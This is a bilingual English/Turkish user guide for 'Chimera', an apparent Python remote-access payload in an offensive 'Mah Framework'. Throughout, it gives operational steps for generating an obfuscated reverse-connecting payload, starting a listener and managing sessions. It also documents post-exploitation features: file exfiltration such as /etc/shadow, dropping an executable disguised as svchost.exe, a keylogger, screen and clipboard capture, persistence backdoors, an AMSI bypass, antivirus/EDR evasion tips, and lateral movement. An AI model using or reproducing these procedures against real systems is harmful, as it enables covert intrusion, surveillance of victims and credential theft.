# Chimera User Guide / Chimera Kullanım Rehberi

[🇬🇧 English](#-english) | [🇹🇷 Türkçe](#-türkçe)

> Docs index: [README.md](README.md) · Commands detail: [CHIMERA_COMMANDS_USAGE.md](CHIMERA_COMMANDS_USAGE.md) · In-memory modules: [chimera_module_loading.md](chimera_module_loading.md)

---

<a name="-english"></a>
## 🇬🇧 English

This guide contains detailed instructions for using the next-generation Python-based **Chimera** payload system included in Mah Framework.

### 1. Basic Usage

#### 1.1. Generating Payload
The `generate.py` module is used to create the Chimera payload. Obfuscation and compilation features are also managed from this module.

```
mah > use payloads/python/chimera/generate
mah (payloads/python/chimera/generate) > info

mah (payloads/python/chimera/generate) > set LHOST 192.168.1.10
mah (payloads/python/chimera/generate) > set LPORT 4444
mah (payloads/python/chimera/generate) > set OBFUSCATE true
mah (payloads/python/chimera/generate) > set BUILD false
mah (payloads/python/chimera/generate) > run
```

The generated payload will be saved under the `output/` directory (or the designated OUTPUT path).

#### 1.2. Starting Handler
To listen for incoming connections from Chimera, the `exploit/multi/handler` module is used.

```
mah > use exploit/multi/handler
mah (exploit/multi/handler) > set PAYLOAD payloads/python/chimera/generate
mah (exploit/multi/handler) > set LHOST 192.168.1.10
mah (exploit/multi/handler) > set LPORT 4444
mah (exploit/multi/handler) > set BACKGROUND false
mah (exploit/multi/handler) > run
```

This module starts a secure listener continuously running in the foreground (AES-256-GCM + ECDH) that supports multi-client connections. If `BACKGROUND` is set to `true`, the shell drops back to the main prompt while listening silently.

#### 1.3. Session Management
When a connection is received, a new session is created. Use the `sessions` command to manage sessions.

*   To list:
    ```
    mah > sessions -l
    ```
*   To enter a specific session (e.g., session ID 1):
    ```
    mah > sessions -i 1
    ```

Once inside a session, you will see a prompt like `chimera (1) >`.

---

### 2. Detailed Usage For Each Feature

Below are the features available after entering a Chimera session (`sessions -i X`):

#### 2.1. Basic Commands
*   `help`: Lists all commands and their descriptions.
*   `sysinfo`: Retrieves the operating system, architecture, and basic info of the target system.
*   `getuid` / `whoami`: Returns the current user (or authority) name.
*   `pwd`: Prints the current working directory on the target system.
*   `detect`: Analyzes security measures such as Antivirus, EDR, Virtual Machine, and Sandbox.

#### 2.2. Command Execution
You can directly run standard CMD/Bash commands on the system. Commands are executed in a hidden window (Windows).

Examples:
```
chimera (1) > ipconfig
chimera (1) > net user
chimera (1) > ps aux
```

#### 2.3. Shell Spawning
Opens an interactive, real-time, and fully functional `bash`/`cmd` / `powershell` shell on the target system.

*   To start:
    ```
    chimera (1) > shell
    [*] Shell oturumu başlatılıyor...
    [+] Shell aktif. Çıkmak için 'exit' yazın.
    ```
*   Usage: Enter commands directly as if you were in the target's shell.
*   To exit, simply type `exit` in the target's shell. It drops you back to the `chimera` prompt.

#### 2.4. File Operations
File upload, download, and directory management operations.

*   **ls / dir:** Lists the contents of the current directory.
*   **cd <directory>:** Changes to a different directory.
*   **mkdir <directory>:** Creates a new folder.
*   **rm <file/directory>:** Deletes the specified file or directory.
*   **upload <local_file> <target_path>:** Uploads a file from your machine to the target system. (Chunking is supported for large files)
    ```
    chimera (1) > upload /root/tools/exploit.exe C:\Windows\Temp\svchost.exe
    ```
*   **download <target_file> <local_path>:** Downloads a file from the target system to your machine.
    ```
    chimera (1) > download /etc/shadow ./shadow.txt
    ```

#### 2.5. In-Memory Module Loading
Send Python modules to the target via the Handler and execute them directly in RAM. Nothing is written to the disk.

*   **loadmodule <module_path/.py_file>:** Loads the specified python file into memory.
    ```
    chimera (1) > loadmodule modules/post/example_module.py
    ```
*   **listmodules:** Lists modules successfully loaded into RAM and ready for use.
*   **runmodule <module_name>:** Executes the loaded module's `run()` function in-memory on the target machine.

#### 2.6. Surveillance
Used to monitor user activities and collect information.

*   **screenshot:** Takes a high-quality copy of the user's screen instantly and downloads it over the network. Leaves no disk trace.
*   **keylogger_start:** Starts a silently running keylogger in the background on the target system.
*   **keylogger_dump:** Pulls the keystrokes recorded by the keylogger.
*   **keylogger_stop:** Stops the running keylogger process.
*   **clipboard:** Reads the text from the victim's copy/paste clipboard.

#### 2.7. Persistence
Places a backdoor so Chimera runs again after the device restarts.

*   **persistence_install:** Installs the appropriate persistence method for the target OS (Windows Registry Run Key, Task Scheduler, or Linux Cron/Service).
*   **persistence_remove:** Cleans the installed persistence traces from the system.

#### 2.8. Advanced Evasion
*   **amsi_bypass:** Disables the AMSI protection memory on Windows by patching it, useful for running advanced scripts and powershell without warnings.

#### 2.9. Networking
Used for lateral movement within the internal network.

*   **portfwd:** Allows tunneling to the ports of the target machine.
    *   Example commands: `portfwd add`, `portfwd list`, `portfwd del`, `portfwd stop`
*   **netscan:** Scans other computers on the network the target system is connected to. Performs Ping sweep, ARP scan, and TCP port scan.
    *   Example commands: `netscan sweep`, `netscan arp`, `netscan ports`

---

### 3. Troubleshooting

Evaluate the following situations if you encounter any problems.

**Connection Problems:**
*   **Agent not connecting:** Verify the `LHOST` and `LPORT` values are correct. Make sure the Handler is started and listening (`netstat -tulpn | grep LPORT`).
*   **Max Reconnect Exceeded:** The agent attempts to reconnect up to the defined `MAX_RECONNECT` limit when the connection breaks in the background, terminating if exceeded.

**Encryption Errors:**
*   Chimera fully encrypts itself with AES+ECDH. If you get an SSL or protocol mismatch error, ensure you are using `exploit/multi/handler` (with PAYLOAD set) instead of netcat (nc).

**Firewall / AV Blocks:**
*   If Windows Defender or EDR blocks the payload during testing, try bypassing static analysis by setting `OBFUSCATE` to `true` in `generate.py` and regenerating it.

**Performance Optimization:**
*   Instead of too many `shell` sessions, it is recommended to perform operations directly with non-interactive commands in Chimera and the `loadmodule` approach for stability. Slowdowns depending on network speed can occur while tunneling (`portfwd`) is active.

---

<a name="-türkçe"></a>
## 🇹🇷 Türkçe

Bu rehber, Mah Framework içerisinde yer alan yeni nesil Python tabanlı **Chimera** payload sisteminin detaylı kullanımını içerir.

### 1. Temel Kullanım

#### 1.1. Payload Oluşturma
Chimera payload'ı oluşturmak için `generate.py` modülü kullanılır. Obfuscation ve derleme özellikleri de bu modülden yönetilir.

```
mah > use payloads/python/chimera/generate
mah (payloads/python/chimera/generate) > info

mah (payloads/python/chimera/generate) > set LHOST 192.168.1.10
mah (payloads/python/chimera/generate) > set LPORT 4444
mah (payloads/python/chimera/generate) > set OBFUSCATE true
mah (payloads/python/chimera/generate) > set BUILD false
mah (payloads/python/chimera/generate) > run
```

Oluşturulan payload `output/` dizini (veya belirlenen OUTPUT yolu) altına kaydedilecektir.

#### 1.2. Handler Başlatma
Chimera'dan gelen bağlantıları dinlemek için `exploit/multi/handler` modülü kullanılır.

```
mah > use exploit/multi/handler
mah (exploit/multi/handler) > set PAYLOAD payloads/python/chimera/generate
mah (exploit/multi/handler) > set LHOST 192.168.1.10
mah (exploit/multi/handler) > set LPORT 4444
mah (exploit/multi/handler) > set BACKGROUND false
mah (exploit/multi/handler) > run
```

Bu modül ön planda güvenli (AES-256-GCM + ECDH) ve çoklu bağlantı (multi-client) destekleyen dinleyiciyi başlatır. Eğer `BACKGROUND` seçeneği `true` yapılırsa, dinleyici sessizce ana menünün arkasında çalışmaya devam eder.

#### 1.3. Session Yönetimi
Bağlantı geldiğinde yeni bir session oluşur. Session'ları yönetmek için `sessions` komutu kullanılır.

*   Listelemek için:
    ```
    mah > sessions -l
    ```
*   Belirli bir oturuma girmek için (örneğin ID'si 1 olan session):
    ```
    mah > sessions -i 1
    ```

Session içine girdiğinizde artık `chimera (1) >` şeklinde bir prompt göreceksiniz.

---

### 2. Her Özellik İçin Detaylı Kullanım

Chimera oturumuna (`sessions -i X`) girdikten sonra kullanabileceğiniz özellikler aşağıdadır:

#### 2.1. Temel Komutlar
*   `help`: Tüm komutları ve açıklamalarını listeler.
*   `sysinfo`: Hedef sistem işletim sistemi, mimarisi ve temel bilgisini getirir.
*   `getuid` / `whoami`: Mevcut kullanıcının (veya yetkinin) ismini döndürür.
*   `pwd`: Hedef sistemde bulunulan geçerli çalışma dizinini yazdırır.
*   `detect`: Antivirüs, EDR, Virtual Machine ve Sandbox gibi güvenlik önlemlerinin analizini yapar.

#### 2.2. Komut Çalıştırma
Sistem üzerinde standart CMD/Bash komutlarını çalıştırmak için doğrudan komutu kullanabilirsiniz. Komutlar gizli pencerede çalıştırılır (Windows).

Örnekler:
```
chimera (1) > ipconfig
chimera (1) > net user
chimera (1) > ps aux
```

#### 2.3. Shell Spawning
Hedef sistemde interaktif, gerçek zamanlı ve tam fonksiyonel bir `bash`/`cmd` / `powershell` kabuğu açar.

*   Başlatmak için:
    ```
    chimera (1) > shell
    [*] Shell oturumu başlatılıyor...
    [+] Shell aktif. Çıkmak için 'exit' yazın.
    ```
*   Kullanım: Doğrudan o sistemin shell'indeymiş gibi komutlar girebilirsiniz.
*   Çıkmak için, hedefin shell'ine `exit` yazmanız yeterlidir. Sizi doğrudan `chimera` prompt'una geri atar.

#### 2.4. Dosya İşlemleri
Dosya yükleme, indirme ve dizin yönetimi işlemleri.

*   **ls / dir:** Bulunulan dizinin içeriğini listeler.
*   **cd <dizin>:** Farklı bir dizine geçer.
*   **mkdir <dizin>:** Yeni bir klasör oluşturur.
*   **rm <dosya/dizin>:** Hedefteki dosyayı veya dizini siler.
*   **upload <yerel_dosya> <hedef_yol>:** Makinenizden hedef sisteme dosya yükler. (Büyük dosyalar için chunking desteklenir)
    ```
    chimera (1) > upload /root/tools/exploit.exe C:\Windows\Temp\svchost.exe
    ```
*   **download <hedef_dosya> <yerel_yol>:** Hedef sistemden sizin makinenize dosya çeker.
    ```
    chimera (1) > download /etc/shadow ./shadow.txt
    ```

#### 2.5. Modül Yükleme (In-Memory Module Loading)
Handler üzerinden hedefe Python modülleri gönderip doğrudan RAM üzerinde çalıştırabilirsiniz. Disk'e hiçbir şey yazılmaz.

*   **loadmodule <modül_yolu/.py_dosyasi>:** Belirtilen python dosyasını belleğe yükler.
    ```
    chimera (1) > loadmodule modules/post/example_module.py
    ```
*   **listmodules:** RAM'e başarılı şekilde yüklenmiş ve kullanıma hazır modülleri listeler.
*   **runmodule <modül_ismi>:** Yüklenmiş modülün `run()` fonksiyonunu hedef makinede in-memory çalıştırır.

#### 2.6. Gözetleme (Surveillance)
Kullanıcı aktivitelerini izlemek ve bilgi toplamak için kullanılır.

*   **screenshot:** Kullanıcının ekranıntısının yüksek kalitede bir kopyasını anlık olarak çeker ve ağ üzerinden indirir. Disk izi bırakmaz.
*   **keylogger_start:** Hedef sistemde arka planda sessiz çalışan bir keylogger başlatır.
*   **keylogger_dump:** Keylogger tarafından kaydedilen tuş vuruşlarını çeker.
*   **keylogger_stop:** Çalışan keylogger işlemini durdurur.
*   **clipboard:** Kurbanın kopyalama/yapıştırma panosundaki metni okur.

#### 2.7. Kalıcılık (Persistence)
Cihaz yeniden başladıktan sonra Chimera'nın tekrar çalışması için arka kapı (backdoor) yerleştirilmesi.

*   **persistence_install:** Hedef işletim sistemine uygun kalıcılık metodunu yükler. (Windows Registry Run Key, Task Scheduler veya Linux Cron/Service)
*   **persistence_remove:** Yüklenmiş kalıcılık izlerini sistemden temizler.

#### 2.8. İleri Seviye Gizlilik (Evasion)
*   **amsi_bypass:** Windows üzerinde AMSI koruma belleğini yamalayarak devredışı bırakır, uyarısız powershell ve gelişmiş betik çalıştırmaya yarar.

#### 2.9. Ağ İşlemleri (Networking)
İç ağda yatay hareket (lateral movement) yapmak için kullanılır.

*   **portfwd:** Hedef makinenin portlarına tünel açmayı sağlar. 
    *   Örnek komutlar: `portfwd add`, `portfwd list`, `portfwd del`, `portfwd stop`
*   **netscan:** Hedef sistemin bağlı olduğu ağda diğer bilgisayarları tarar. Ping sweep, ARP scan, TCP port taraması yapar.
    *   Örnek komutlar: `netscan sweep`, `netscan arp`, `netscan ports`

---

### 3. Troubleshooting (Sorun Giderme)

Herhangi bir sorunla karşılaşırsanız aşağıdaki durumları değerlendirin.

**Bağlantı Sorunları:**
*   **Agent bağlanmıyor:** `LHOST` ve `LPORT` değerlerinin doğruluğunu teyit edin. Handler'ı başlatıp dinlemede olduğundan emin olun (`netstat -tulpn | grep LPORT`). 
*   **Max Reconnect Aşılması:** Agent arka planda bağlantı koptuğunda belirlenen `MAX_RECONNECT` limiti kadar yeniden bağlanmayı dener, aşılırsa sonlanır.

**Şifreleme Hataları:**
*   Chimera kendini AES+ECDH ile tamamen şifreler. SSL veya protokol uyuşmazlığı hatası alıyorsanız netcat (nc) yerine `exploit/multi/handler` (PAYLOAD set edilmiş şekilde) kullandığınızdan emin olun.

**Firewall / AV Engelleri:**
*   Test sırasında Windows Defender veya EDR payload'u bloke ediyorsa `generate.py` içerisinde `OBFUSCATE` ayarını `true` olarak ayarlayıp yeniden oluşturmayı deneyerek statik analizi atlatmayı deneyin.

**Performans Optimizasyonu:**
*   Çok fazla `shell` oturumu yerine stabilite için işlemleri doğrudan Chimera içerisinde interaktif olmayan komutlarla ve `loadmodule` yaklaşımıyla yapılması tavsiye edilir. Tünelleme (`portfwd`) aktifken ağ hızına bağlı yavaşlamalar görülebilir.
